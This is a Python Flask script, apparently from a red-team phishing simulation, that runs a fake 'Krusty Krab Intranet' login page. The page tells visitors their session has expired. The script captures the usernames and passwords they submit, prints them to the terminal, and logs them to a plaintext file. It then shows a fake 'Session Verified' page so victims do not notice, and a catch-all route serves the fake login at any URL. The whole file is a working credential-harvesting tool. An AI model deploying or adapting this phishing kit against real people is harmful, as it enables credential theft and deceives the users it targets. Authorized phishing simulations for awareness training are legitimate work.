#!/usr/bin/env python3
# =====================================================================
# Krusty Krab Fake Intranet - Credential Harvester
# Run on redTeamVM. Captures POST credentials and prints to terminal.
# =====================================================================
# USAGE:
#   sudo python3 harvester.py
#
# Listens on 0.0.0.0:80 so it is reachable on the VPN network.
# Requires root (or sudo) to bind port 80.
# If you prefer not to use sudo, change PORT to 8080 and update
# $FakeIntranetUrl in phishing_simulation_FUNCTIONAL.ps1 / phishing_simulation_SECURE.ps1 accordingly.
# =====================================================================

from flask import Flask, request, redirect
from datetime import datetime
import sys
import os

app = Flask(__name__)

PORT = 80

# ANSI colors for terminal output
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

CAPTURE_LOG = os.path.join(os.path.dirname(__file__), "captured_creds.log")

FAKE_LOGIN_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Krusty Krab Intranet - Sign In</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: Arial, sans-serif;
            background: #1a1a2e;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background: white;
            border-radius: 8px;
            padding: 40px;
            width: 380px;
            box-shadow: 0 4px 24px rgba(0,0,0,0.4);
        }
        .logo {
            text-align: center;
            margin-bottom: 24px;
        }
        .logo h1 {
            color: #8B0000;
            font-size: 22px;
        }
        .logo p {
            color: #666;
            font-size: 13px;
            margin-top: 4px;
        }
        .banner {
            background: #fff3cd;
            border: 1px solid #ffc107;
            border-radius: 4px;
            padding: 10px 14px;
            font-size: 13px;
            color: #856404;
            margin-bottom: 20px;
        }
        label {
            display: block;
            font-size: 13px;
            color: #333;
            margin-bottom: 5px;
            margin-top: 14px;
            font-weight: bold;
        }
        input[type=text], input[type=password] {
            width: 100%;
            padding: 10px 12px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 14px;
        }
        input[type=text]:focus, input[type=password]:focus {
            outline: none;
            border-color: #8B0000;
        }
        button {
            width: 100%;
            padding: 11px;
            background: #8B0000;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 15px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 22px;
        }
        button:hover { background: #6b0000; }
        .footer {
            text-align: center;
            font-size: 11px;
            color: #999;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>&#127992; Krusty Krab Intranet</h1>
            <p>Employee Portal &mdash; krustykrab.local</p>
        </div>
        <div class="banner">
            &#9888; Your session has expired. Please sign in again to continue.
        </div>
        <form method="POST" action="/login">
            <label for="username">Email Address</label>
            <input type="text" id="username" name="username" placeholder="you@krustykrab.local" autocomplete="off">
            <label for="password">Password</label>
            <input type="password" id="password" name="password" placeholder="Password">
            <button type="submit">Sign In</button>
        </form>
        <div class="footer">Krusty Krab Internal Systems &copy; 2026 &mdash; All Rights Reserved</div>
    </div>
</body>
</html>"""

THANK_YOU_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Krusty Krab Intranet</title>
    <meta http-equiv="refresh" content="3;url=/">
    <style>
        body { font-family: Arial, sans-serif; background: #1a1a2e; display: flex;
               justify-content: center; align-items: center; min-height: 100vh; }
        .box { background: white; border-radius: 8px; padding: 40px; text-align: center; width: 360px; }
        h2 { color: #2d6a2d; margin-bottom: 12px; }
        p  { color: #555; font-size: 14px; }
    </style>
</head>
<body>
    <div class="box">
        <h2>&#10003; Session Verified</h2>
        <p>Your identity has been confirmed. Redirecting you to the intranet&hellip;</p>
    </div>
</body>
</html>"""


def log_capture(username, password, ip, user_agent):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # --- Terminal output (real-time, colorized) ---
    print()
    print(f"{RED}{BOLD}{'='*60}{RESET}")
    print(f"{RED}{BOLD}  !! CREDENTIALS CAPTURED !!{RESET}")
    print(f"{RED}{BOLD}{'='*60}{RESET}")
    print(f"{YELLOW}  Time      :{RESET} {timestamp}")
    print(f"{YELLOW}  Username  :{RESET} {CYAN}{BOLD}{username}{RESET}")
    print(f"{YELLOW}  Password  :{RESET} {CYAN}{BOLD}{password}{RESET}")
    print(f"{YELLOW}  Source IP :{RESET} {ip}")
    print(f"{YELLOW}  UserAgent :{RESET} {user_agent[:80] if user_agent else 'N/A'}")
    print(f"{RED}{BOLD}{'='*60}{RESET}")
    print()
    sys.stdout.flush()   # force immediate print - no buffering

    # --- File log ---
    try:
        with open(CAPTURE_LOG, "a") as f:
            f.write(f"[{timestamp}] USERNAME={username}  PASSWORD={password}  IP={ip}  UA={user_agent}\n")
            f.flush()
    except Exception as e:
        print(f"{YELLOW}[WARN] Could not write to log file: {e}{RESET}")
        sys.stdout.flush()


@app.route("/", methods=["GET"])
def index():
    return FAKE_LOGIN_HTML, 200

@app.route("/login", methods=["GET"])
def login_get():
    return FAKE_LOGIN_HTML, 200

@app.route("/login", methods=["POST"])
def login_post():
    username   = request.form.get("username", "").strip()
    password   = request.form.get("password", "").strip()
    ip         = request.headers.get("X-Forwarded-For", request.remote_addr)
    user_agent = request.headers.get("User-Agent", "")

    log_capture(username, password, ip, user_agent)

    # Return the thank-you page so the simulation script gets a 200
    # and the victim sees a convincing confirmation before redirect
    return THANK_YOU_HTML, 200

@app.route("/wp-admin/verify", methods=["GET", "POST"])
def wp_verify():
    # Alternative path - catches any variant URLs used in phishing emails
    if request.method == "POST":
        return login_post()
    return FAKE_LOGIN_HTML, 200

# Catch-all: any path not matched above serves the login page
# This means any URL on this host looks like the intranet
@app.errorhandler(404)
def catch_all(e):
    return FAKE_LOGIN_HTML, 200


if __name__ == "__main__":
    print(f"{BOLD}")
    print("  ╔══════════════════════════════════════════════╗")
    print("  ║   Krusty Krab Fake Intranet - Harvester      ║")
    print("  ║   Red Team Credential Capture                ║")
    print("  ╚══════════════════════════════════════════════╝")
    print(f"{RESET}")
    print(f"{GREEN}[*] Starting listener on 0.0.0.0:{PORT}{RESET}")
    print(f"{GREEN}[*] Credential log: {CAPTURE_LOG}{RESET}")
    print(f"{GREEN}[*] Waiting for victims...{RESET}")
    print(f"{YELLOW}[*] Press Ctrl+C to stop.{RESET}")
    print()
    sys.stdout.flush()

    # use_reloader=False prevents the double-startup print that
    # Flask's reloader causes - cleaner terminal output
    app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False)
